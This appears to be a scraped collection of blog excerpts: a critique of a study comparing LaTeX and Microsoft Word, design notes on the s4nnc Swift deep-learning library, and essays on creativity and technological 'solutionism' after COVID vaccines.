<p>That said, DuckDuckGo did much better for non-technical search queries. For example, “watch Breaking Bad” takes you to a list of places you can watch the TV show “Breaking Bad.” The results are similar enough to Google’s that you probably wouldn’t notice the difference.</p>
<p>What do you think? Should there be a major player in the search engine market that is not for profit? Is it even necessary? Let me hear your thoughts on <a href="https://twitter.com/KarlLHughes">Twitter</a>.</p>

<p>There’s an important trade-off you need to make in order to be more creative: you need to be willing to <em>feel</em> less productive.</p>



<p>I say “feel” instead of “be” because productivity can be a really subjective and delusive game.</p>



<p>Even though efficiency freaks like to measure everything, what usually determines whether they were productive or not is their expectations. And those tend to be very high.</p>



<p>You should definitely work on adjusting your expectations about productivity. But, in the meantime, the best thing you can do is learn how to deal with unproductive guilt.</p>



<p>Because being more creative inevitably requires engaging in “unproductive” behaviors. Like sleeping, going for a walk (without your phone) or meditating.</p>



<p>Creativity is an unconscious and organic process. A great deal of the action happens behind the scenes. And like nature, it works on its own schedule.</p>



<p>You can foster and nurture creativity. But you can’t rush it.</p>



<p>Your mind needs time and space to chew experiences and information, process them, and make novel, interesting connections.</p>



<p>“Productive” people call it procrastination. For creatives, it is the making of a new idea.</p>

<p>
The boss needed item 3 inserted into a numbered list of hundreds of items.
The intern used a mouse to select the original 3 on the screen,
then typed 4,
then selected the original 4,
then typed 5,
then scrolled down,
then selected the original 5,
then typed 6,
and so on.
Another intern sat watching the screen to make sure there were no mistakes.
</p>
<p>
I happened to be in the room for other reasons.
I remember the horror of watching the beginning of this barbaric editing process.
Those poor interns!
</p>
<p>
When I enter a list of items into the computer,
what I'm typing doesn't look like
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but more like
</p>
<pre>     * ...
     * ...
     * ...
</pre>
<p>
Each asterisk is a special command to the computer,
telling the computer to automatically display the next number for the reader.
The reader eventually sees
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but that isn't what I typed.
This small difference produces a tremendous savings of time
whenever I insert an item, or delete an item, or move an item.
</p>
<p>
If I decide later
to skip the numbers
and use bullets instead,
I tell the computer
to introduce each list item with a bullet.
This is one command covering the whole list.
There's also a command that does the same thing
for the whole document.
There isn't separate work for each item.
It's no problem if a coauthor
later wants to change bullets back to numbers.
</p>
<p>
The interns, I suppose,
would be manually changing "1." and "2." and "3."
and so on to "•" and "•" and "•" and so on.
Or maybe they would be trying to figure out
how some search-and-replace feature could do the same thing;
let's hope the document doesn't have a sentence somewhere
that talks about something that happened in the year 2001.
Or maybe the interns would be quitting and finding a better job.
</p>
<p>
[Note added 2020.12.07:
I was expecting that many of my readers
would already be accustomed to relying on the computer
for automatic numbering.
I was surprised, however,
to see some comments along the lines of "Inconceivable!"
from readers unable to imagine
how the interns could have been in a different situation,
going through such a shockingly inefficient revision process.
Here's a hint:
Each item in the list looked like a flush-left paragraph,
like the paragraphs in this blog post,
adjacent to the left margin.
The text being selected by the mouse,
for example to change "3" to "4",
was to the right of the margin,
like the rest of the text in each item.]
</p>
<p>
<b>Abstraction as a time-saver for authors.</b>
This use of asterisks
is just one example of how I'm often typing something more abstract
than what's seen by the ultimate reader.
I don't type "Figure 12" or "see [41]", for example;
I type things like "Figure \ref{network-measurements}" and "see \cite{multiplication-survey}",
and I let the computer automatically convert
"\ref{network-measurements}" and "\cite{multiplication-survey}"
into numbers to display for the reader.
</p>
<p>
With one extra command,
covering the entire document,
I can tell the computer
to include section numbers
as part of all figure numbers in the document,
so that the figures are easier for the reader to find:
e.g., Figures 3.1 and 3.2 and 3.3 are in Section 3.
With another command,
again covering the entire document,
I can tell the computer
to cite all authors by name rather than by number.
</p>
<p>
As another example,
I was recently editing a mathematical paper,
and I decided that a particular concept
would be easier for the reader to remember
if I changed the notation that I was using for the concept.
The notation was all over the paper,
but this change took just a few seconds of editing.
I had given a name to the concept,
had told the computer <i>once</i> to display this name as a particular notation,
and had then typed this name throughout the paper,
so there was only one place where I had to change the notation.
</p>
<p>
Of course one can't,
and shouldn't try to,
prepare in advance for <i>every</i> possible change to a document.
But it's not hard to prepare for the most likely changes.
This small initial effort
saves a tremendous amount of time later.
When I say "small",
I'm including the effort to select a document-creation system
that's designed to
<a href="https://en.wikipedia.org/wiki/LaTeX">make this sort of thing easy</a>.
</p>
<p>
(As a side note,
programmers will recognize this strategy
as an example of the
<a href="https://en.wikipedia.org/wiki/Information%5Fhiding">information hiding</a>
strategy introduced by Parnas,
and will recognize that modern program-creation systems
are designed to make this easy.)
</p>
<p>
Microsoft Word isn't completely missing abstractions,
but these abstractions
are competing for user-interface resources
against features encouraging the user
to work at lower abstraction layers.
The extra effort to use the abstractions
ends up pushing users into doing something simpler,
something that just works now,
and paying heavily for this choice
later when the document is being revised.
</p>
<p>
Have I done a scientific study
<i>proving</i> that Microsoft Word
is less efficient than LaTeX?
No.
I'd love to see a careful study of this topic.
Short-term,
this would help guide new authors to make sensible choices.
Longer-term,
insights from this sort of study could be the basis for further improving
our document-creation systems.
I certainly don't think that the existing systems are perfect.
(<a href="https://cr.yp.to/writing/visual.html">Example.</a>)
</p>
<p>
Imagine, however, that a study looks only at
<i>the time for someone looking at a printout to create a document matching this printout</i>.
This would be blind to the time for subsequent edits.
This would be blind to the suffering of those interns.
This would incorrectly conclude that typing
"1. ... 2. ... 3. ..." and "see [41]"
is more efficient than typing
"* ... * ... * ..." and "see \cite{multiplication-survey}".
It <i>is</i> slightly more efficient in this limited metric,
but it is much less efficient in the metric that matters,
namely the total time spent by the user.
</p>
<p>
<b>An example of a "scientific" study.</b>
At this point you're probably thinking that
nobody could possibly miss such an obvious issue.
This brings me to the main topic of this blog post,
a 2014 peer-reviewed study
<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0115069">"An Efficiency Comparison of Document Preparation Systems Used in Academic Research and Development"</a>
by two psychologists,
Knauff and Nejasmic ("KN").
</p>
<p>
Participants in the study were given a page of text
and were given a limited time to type the page into the computer.
There were three different types of text:
</p>
<ul>
<li>simple prose with a few footnotes;
</li>
<li>a page with a complicated table of data;
and
</li>
<li>a page with many mathematical formulas.
</li>
</ul>
<p>
Participants were scored
on the basis of how much text they typed and how accurately they typed it.
The time was so rushed that a significant fraction of participants
didn't finish typing the whole page,
even for the case of simple prose.
</p>
<p>
The study considered two document-creation systems:
LaTeX and Microsoft Word,
in each case with "all tools, editors, plug-ins, and add-ons"
that participants were "accustomed to using".
Of course different "add-ons" could have different efficiency,
and of course there are other document-creation systems,
but these are topics for another blog post.
</p>
<p>
The study produced many pages of results,
which I'll summarize by saying that
Word did slightly better on the prose
and much better on the table,
while LaTeX did better on the formulas.
The study authors made no effort to measure any subsequent document-editing step.
</p>
<p>
<b>Slithering from one metric to another.</b>
The fundamental mistake in the KN paper
is the change of cost metric.
</p>
<p>
The original question was how efficiently authors are creating documents:
in particular, how efficiently authors are creating academic research papers.
KN claimed in their title to be comparing "efficiency"
of "document preparation systems used in academic research".
But they then quietly changed this metric in three ways:
</p>
<ul>
<li>
They considered only the efficiency of an initial fragment of the document-creation process,
ignoring the time spent revising documents.
They provided no reason to believe that the efficiency of this fragment
was well correlated with what they had previously claimed to be measuring.
Nothing in their paper acknowledges
the most obvious reason for a negative correlation,
namely that slightly more work at the outset
makes revisions much easier later.
In my experience,
document-creation systems vary in how well they support this work.
</li>
<li>
KN didn't even measure the time taken for this initial fragment of the process.
Instead they imposed a rushed time limit,
and measured how incomplete and inaccurate the resulting document was.
Again they provided no reason to believe that what they measured
was well correlated with what they had previously claimed to be measuring.
Perhaps they were assuming that more mistakes will take more time to fix,
but my experience is that some types of mistakes are much easier to fix than others,
and that document-creation systems vary in the types of mistakes they encourage.
</li>
<li>
KN didn't even measure creating a <i>new</i> document,
which is what academics are actually spending their time doing.
People who were writing papers in the age of typewriters
will remember writing and editing papers <i>by hand</i>
before tediously typing the final pages,
but that was because editing a typed page
ranged from annoying
(<a href="https://en.wikipedia.org/wiki/Correction%5Ffluid">white-out</a>,
or sometimes scissors and tape)
to super-annoying
(retyping the whole page).
Today the initial writing on paper is skipped,
and typing is interleaved in small chunks
with parts of the author's thought process,
making the typing process much less boring.
I'm continually re-reading
and thinking about what I just typed.
Is the error rate of the academic's modern typing process
well correlated with the error rate of the
archaic retyping process that KN measured?
Again KN provide no reason to believe this.
</li>
</ul>
<p>
Did KN use the honest title
"A comparison of the unreliability of
rushed retyping of a page
using document preparation systems
that are also used for academic research and development"?
No.
Would you expect a journal to accept a paper
with such a title?
</p>
<p>
Instead they used a title …</p></div>

December 6, 2020 | https://liuliu.me/eyes/on-designing-deep-learning-library-api-in-swift/ | <a href="https://web.archive.org/web/*/https://liuliu.me/eyes/on-designing-deep-learning-library-api-in-swift/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>From the onset of implementing <a href="https://libnnc.org/">libnnc</a>, it meant to be a common ground for higher-level language bindings beyond Python. The underlying architecture has been stable for a year or so, and I have been using it for some personal projects for a while. But the raw C interface is not the easiest to use, it is the time to implement some high-level language bindings for that library.</p>

<p>The default high-level language for deep learning likely would be Python. However, I am not happy with how it performs on a typical many-core system even with things that are supposed to help. Swift, on the other hand, has no issues with saturating my many-core system and it has a reasonable <a href="https://github.com/pvieito/PythonKit">Python binding</a> to tap into the rich Python tool-kits. Not to mention the <em>calling C functions from Swift</em> path is as easy as you possibly can get.</p>

<p>This conviction resulted <a href="https://github.com/liuliu/s4nnc">s4nnc</a>, a Swift language binding for <a href="https://libnnc.org/">libnnc</a>. Because <a href="https://github.com/liuliu/s4nnc">s4nnc</a> is a pure interface to interact with the underlying deep learning library. I paid close attention to its API design. Below are some design notes around why it is, and how Swift as a language fares on such a task. If you want to read the introduction to s4nnc, feel free to visit the <a href="https://github.com/liuliu/s4nnc">GitHub homepage</a>.</p>

<h3 id="what-is-a-deep-learning-library-api">What is a Deep Learning Library API</h3>

<p>A good deep learning API to me, can be largely modeled after <a href="https://keras.io/">Keras</a> and <a href="https://pytorch.org/">PyTorch</a>. It concerns, above all, with 2 questions:</p>

<ol>
  <li>How to specify a deep learning model?</li>
  <li>How to construct a training loop?</li>
</ol>

<p>Everything else is nice-to-have and largely orthogonal to these two questions (but these whistles-and-bells are a lot of hard work!).</p>

<p>A training loop consists of a repeated sequence of operations to: evaluate a model, compute gradients against the loss, apply gradients to update model parameters.</p>

<p>The details can be flexible: you could evaluate one part of the model in one round, and another part in another round; you could have different losses for different model outputs each round; you could modify the gradients, scale them, truncate them to whatever you liked; and you could apply gradients to update different model parameters with different optimizers. But at the core, I didn’t see much changes for this 3-step throughout many model training code.</p>

<p>What constitutes a model can be more interesting, but it seems we converged to a concept where a model consists of some inputs, some outputs, and some parameters. Particularly, parameters are stateful and internals to the model itself. Go beyond that, a model could have different inputs / outputs and different input / output shapes during the training loop. However, the shapes and number of parameters during the training are likely to be constant.</p>

<h3 id="basic-data-types">Basic Data Types</h3>

<p>A deep learning library operates on multi-dimensional arrays (or tensors). In Swift, a concrete tensor can be represented as a value type like <code>Array</code> itself in Swift. That means the <code>Tensor</code> type would need things such as copy-on-write to implement said value-type semantics. Extra attention needs to be paid to make sure throughout the implementation of the API, no unnecessary copy was made. This value-type choice is a bigger deal than it sounds (it sounds like a no-brainer given <a href="https://www.tensorflow.org/swift">S4TF</a> made exactly the same choice) because in Python, everything is a reference type.</p>

<p>This becomes more interesting when deciding whether <a href="https://libnnc.org/tech/nnc-dy/">tensor variables</a> could be value types or not. Tensor variable is an abstract tensor type which you can compute gradients (has a <code>grad</code> property). It is bound to a computation graph, and can be the parameter to update during the training loop. While it is possible to make many functions associated with tensor variables taking <code>inout</code> parameters and marking some of tensor variables’ functions as <code>mutating</code>, the more hairy part is about updates during the training loop.</p>

<p>In <a href="https://pytorch.org/docs/stable/optim.html">PyTorch</a>, an optimizer takes a list of parameters and then applies new gradients to update these parameters when <code>step()</code> method is called. This is possible because parameters are reference types in Python. Any updates to the parameters will be reflected to the model who holds these parameters. This is not possible if tensor variables are value types. In Swift, you cannot hold a reference to a value type.</p>

<p>Thus, practically, tensor variables have to be implemented as reference types in Swift.</p>

<p>Despite my best intention, it turns out most of the objects, including <code>Graph</code>, <code>Model</code>, <code>StreamContext</code> are still implemented as reference types. It is possible for some of them (for example: the <code>Model</code>) to be value types. The lack of <code>deinit</code> in <code>struct</code> requires us to wrap a reference type inside a value type to create such API. At the end of day, I don’t see much of the value from API aesthetics or performance-wise to make these value types.</p>

<h3 id="automatic-differentiation">Automatic Differentiation</h3>

<p>While Swift has <a href="https://forums.swift.org/t/differentiable-programming-for-gradient-based-machine-learning/42147">a proposal for automatic differentiation</a>, the automatic differentiation right now is implemented at library level and only applicable to models and tensor variables.</p>

<p>On the API side, it is popular to have a <code>backward()</code> method on the final loss variable. The said method will compute gradients against all variables associated with the final computation of the loss.</p>

<p>This also means we need to keep track of all variables in the computation graph, unless some point is reached and we can free them. In PyTorch, such point is when the <code>step()</code> method is called.</p>

<p><a href="https://libnnc.org/tech/nnc-dy/#optimizations">libnnc early on made the decision to avoid holding vast amount of memory by default</a>. That resulted in the interface <code>backward(to tensors: Sequence&lt;Tensor&gt;)</code> where you have to specify to which tensors you compute the gradients against. Because we are doing backward-mode AD, we still compute gradients on all variables up until these tensors. But we don’t compute gradients against variables passed that point. In effect, we can rely on reference-counting to free memory associated with tensors beyond that point.</p>

<p>In return for this a bit more complex interface, you don’t have to worry about scoping to <code>no_grad</code> to avoid unbounded memory allocations.</p>

<h3 id="optimizers-in-the-training-loop">Optimizers in the Training Loop</h3>

<p>An optimizer in a deep learning library represents a particular gradient descent method associated with some parameters to update each round.</p>

<p>One particular challenge is about how to use multiple optimizers with different parameters in one round. While for simpler cases, you could call <code>step()</code> many times in one round. It may be more efficient to call <code>step()</code> once.</p>

<p>Swift makes this particular choice easier by supporting extensions on built-in types.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>public</span> <span>extension</span> <span>Collection</span> <span>where</span> <span>Element</span><span>:</span> <span>Optimizer</span> <span>{</span>
  <span>func</span> <span>step</span><span>()</span> <span>{</span>
    <span>...</span>
  <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is a good starting point to support more concise updates such as: <code>[adam1, adam2].step()</code>.</p>

<p>The same pattern can be applied if you want to support gradients with multiple losses: <code>[loss1, loss2, loss3].backward(to: x)</code>.</p>

<p>These extension methods are conditional, and type-safe in Swift.</p>

<h3 id="operators">Operators</h3>

<p>While Swift allows operator overloading and the ability to introduce custom operators, somehow the ambiguity of <code>*</code> is not addressed. We cannot have consistency with Python because <code>@</code> cannot be overloaded in Swift language. I have to resort to <code>.*</code> and <code>.+</code> for element-wise multiplications and additions.</p>

<h3 id="type-safe-functions">Type-safe Functions</h3>

<p>While Swift can enforce some type consistency, without more language level changes, we cannot deduce shapes, and would still encounter runtime errors if shape doesn’t match. Even with language-level support, we may still need an escape-hatch because some tensors could be loaded from IO. Not to mention it would be nice to support dynamic input shapes to a model while it can still statically compute its parameter shapes.</p>

<h3 id="transparent-multi-gpu-data-parallel-training">Transparent Multi-GPU Data Parallel Training</h3>

<p>One thing annoying in the raw C interface, is the transition from one GPU to multi-GPU, even with simple data-parallel models. Unable to abstract tensor to higher-level in C makes the code unnecessarily complex.</p>

<p>Fortunately, with basic generics, this is not a problem in Swift. However, to use such generics turns out to be more complicated than I expected on the library author side. If I want to avoid runtime type-check (<code>is</code> / <code>as</code> keyword), there are quite a bit of protocol / extension type dance I would need to do. This doesn’t help with Swift’s borderline hostility against protocol-associated types. Luckily, there are <a href="https://forums.swift.org/t/improving-the-ui-of-generics/22814/">new proposals</a> to lift some of the restrictions (and no, <code>some</code> is not all it needs). You can see <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Functional.swift#L3">this monstrosity here</a>. At the end, I have to introduce <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Optimizer.swift#L125">some</a> <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/ModelBuilder.swift#L65">runtime</a> <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Store.swift#L31">type-checks</a> to keep my sanity.</p>

<h3 id="closing-words">Closing Words</h3>

<p>I am pretty happy with the end result of <a href="https://github.com/liuliu/s4nnc">s4nnc</a>. It is small, versatile and does exactly what I set out to: an ergonomics win from the raw C interface. Generics, type-safety and reference-counting in Swift the language really made a difference in the API ergonomics. The language itself is not the fastest, but has a good balance in ergonomics, expressivity and performance. In the next blog post, I am going to detail the Swift data science workflow I had, and why we moved to this from the initial Python one. Stay tuned!</p>

<blockquote>
  <p>In the last decade, we’ve basically been taught to deride “solutionism” — while Silicon Valley techbros were bending their genius toward figuring out ways to sell more ads or lower taxi drivers’ wages, inequality was running rampant and parents were struggling to feed their kids. Instead of trusting wizardry to solve the world’s problems, we were supposed to place our faith in politics, in mass action, and in cultural change.</p>

  <p>Except then consider what happened with COVID. Our leaders failed to fight the virus effectively, and the President actively sabotaged containment efforts. Culturally, we screeched our heads off about masks and herd immunity and “just the flu” and beach parties and school closings and bar closings and restaurant closings and dorm closings and so on and so forth. We didn’t implement strict lockdowns and we protested against lockdowns and we didn’t even obey the half-assed lockdowns we did implement. We became one of the planet’s worst-hit countries, despite having the planet’s most expensive health care system. We died in the red states, we died in the blue states. We died in droves, in hundreds of thousands. Collectively, as a society, we wrung our hands and ran in circles and screeched and died and screeched and died and screeched and died until scientists made vaccines against the virus.</p>
</blockquote>

<p>Is this correct? In some ways, Smith stacks the deck in his favor. Scientific breakthroughs on vaccines can be produced by small groups of experts insulated from public pressure and the clown show of 21st century American politics. This was never the case with non-pharmaceutical interventions, even if I share Smith’s sense out of outrage and horror over America’s failed response to COVID.</p>

<p>Comparing them is a little akin to comparing World War II’s military-technical research achievements to the great campaigns of Europe and the Pacific War. The latter required extensive political and organizational coordination on a hitherto unprecedented scale, and buy-in from millions of ordinary people. The former were not exactly a bunch of eggheads in a seminar room, but they represent at least crudely processes that are largely autonomous from the need to attain large-scale consensus and cooperation.</p>

<p>Come next year, when we enter into the challenge of rolling out vaccines while preserving basic social distancing measures, we will get a reminder of how different these two kinds of activities are. I’m more optimistic that next year will be significantly better than 2020 was, but only guardedly. However, Smith is also on to something larger when he notes the dubious framing of how the answer to engineering our way to nirvana is supposed to be large-scale political and cultural change driven by mass popular mobilization.</p>

<p>‘Political solution’ in this framing seems to be a euphemism for either a deliberative process that harmonizes competing views or (more often) the imposition of one’s will on the body politic via political struggle. Neither look particularly promising in a polarized society in which merely putting on a piece of cloth held together with string has become a <a href="https://www.pewresearch.org/politics/2020/06/25/republicans-democrats-move-even-further-apart-in-coronavirus-concerns/">partisan issue</a>. Moreover, Smith <a href="https://www.bloomberg.com/opinion/articles/2019-10-17/california-is-back-on-the-brink-of-being-a-failed-state">observes elsewhere</a> that even in my home state of California – where GOP opposition has been virtually eradicated – single-party dominance has failed to resolve basic governance issues.</p>

<p>Certainly most thoughtful critics of techno-determinism likely will say that they aren’t categorically against the use of technology, but rather criticize a particular mindset that uncritically postulates that objective solutions can be discovered to objectively framed problems and then objectively implemented and accepted by a mostly cooperative public. However, it is hard to tell if they are talking about the technologists or themselves when they make this criticism. Statements like “if only we had the political will” to do something of interest are just as naive as “if only we had the right app.”</p>

<p>Technologists are often criticized for wanting to ‘route around’ the US political system, but <a href="https://www.pewresearch.org/fact-tank/2019/07/22/key-findings-about-americans-declining-trust-in-government-and-each-other/">given</a> low institutional trust and increasingly low interpersonal trust, it is difficult to be entirely critical of that desire. The biggest problem with it is that it often devolves into fantasies of taking one’s toys and exiting into an autonomous space free of the need to gain mass consensus (seasteading!) or instituting impersonal mechanisms that suppress political resistance (make the AI president!) There are idiots. Look around. But we’re all idiots in some shape or form and we’re stuck with each other. What do we do next?</p>

<p>First, somewhat of a meta-point: indirection often is a very underrated way of creating change. Part of what this post is looking to encourage is something I sometimes refer to as the “Andrew Marshall style” of change. For decades, Marshall headed up the Office of Net Assessment (ONA) within the United States Department of Defense. Most people interested in defense and strategy, including yours truly, have in some way directly or indirectly benefited from ONA and its projects. But Marshall did so largely below the radar.</p>

<p>Demanding only autonomy, a tiny (by Pentagon standards) budget, a small office, and the freedom to report directly to the Secretary of Defense, Marshall at first glance took a rather counter-intuitive approach. But this was actually critical to his success. He was not a threat to other people’s bureaucratic rice bowls. But he preserved his own autonomy. And by slowly building up a network of relationships and becoming a hub for innovative work, ONA ended up exercising a profound influence on American national security and defense.</p>

<p>What is remarkable about Marshall’s success is that he propagated his particular institutional relationships forward through decades of changing political, economic, and bureaucratic turmoil while slowly altering the surrounding environment around him. It would be ridiculous to assert that Marshall is singularly responsible for any particular major shift in American national security and defense, but it is also very evident that ONA’s presence and persistence changed the boundary conditions of the US defense and security system.</p>

<p>While many technologists often valorize another Cold War American defense icon – John Boyd – Marshall is also a model worth emulating. Technology is complicated, frustrating, and more often than not disappointing relative to our ambitions. But it can change the boundary conditions of problems. Tweaking the boundary conditions of problems is a big part of how meaningful change can happen overall.</p>

<p>Getting 2-3 promising vaccines in under a year is a great example. Vaccines do not change the massive amount of political and institutional failures America has experienced since the COVID-19 outbreak began. However, consider the alternative world without vaccines that we were in only a short time ago. We had all of those problems but without any kind of roadmap as to how we might escape them. Now we have a <a href="https://www.forbes.com/sites/carlieporterfield/2020/11/15/heres-when-experts-say-things-could-get-back-to-back-to-normal-after-coronavirus/?sh=3f66c9d936ed">hazy but nonetheless meaningful</a> idea of how long it could take to get back to normal, even if there is no really coherent shared idea of ‘normality.’ This is worth celebrating!</p>

<p>Even without a vaccine, we would be much worse off than we are now if everything from the physical network backbone to distributed work solutions did not perform well under significant stress. The Internet, also created originally in part for the purpose of scientific collaboration, enabled scientific researchers around the world to work together at breakneck speed to learn as much as possible about a novel virus and figure out how to attack it. Outside of the US and most <a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/lessons-from-taiwans-experience-with-covid-19/">successfully in Taiwan</a>, governments have also found success in working together with the private sector to manage information flows during the pandemic.</p>

<p>Beyond COVID, what might this mean? Even in the best of times, the <a href="https://texaspolitics.utexas.edu/archive/html/bur/features/0303_02/muddling.html">most</a> we can often accomplish on the most intractable social problems is to <a href="https://texaspolitics.utexas.edu/archive/html/bur/features/0303_02/muddling.html">muddle through</a>. They have <a href="https://link.springer.com/article/10.1007/BF01405730">no inherent point</a> at which they officially stop being problems, and often no inherently correct shared framing. It doesn’t mean that action is pointless, but true students of politics often understand that politics is a secular activity instead of a means of bringing about religious salvation.</p>

<p>It seems unwise to stake our hopes on some kind of decisive reckoning at which political solutions will somehow materialize and then be imposed on our friends, neighbors, and co-workers. Much for the same reason that many of us find that we cannot get even members of our own family to take sensible COVID precautions no matter how much we plead, cajole, and threaten them. Still, we have also seen what happens when we simply stand still and do nothing.</p>

<p>“Techno-scientific” changes in the surrounding environment can do a number of salient things. They can provide tools we did not have before to mitigate problems. They can subtly influence or even shift the dynamics of particular interpersonal and institutional relationships and interactions. New frontiers to explore can distract people that otherwise would make trouble, and a bigger pie can make people feel more generous than they otherwise would be. While much has been made of the costs of technological disruption, breaking up established social hierarchies can be necessary for the system as a whole to survive and grow.</p>

<p>Preventing stasis and injecting more slack into the system are both means to the same end: propagating the system forward into the future. So technological “solutionism” (a term I have always disliked due to its imprecision), is both more and less important than ever. It certainly falls short of the hopes of its biggest boosters and the fears of its opponents. But if you are a technologist looking to make a difference now is as good of a …</p></div></div>
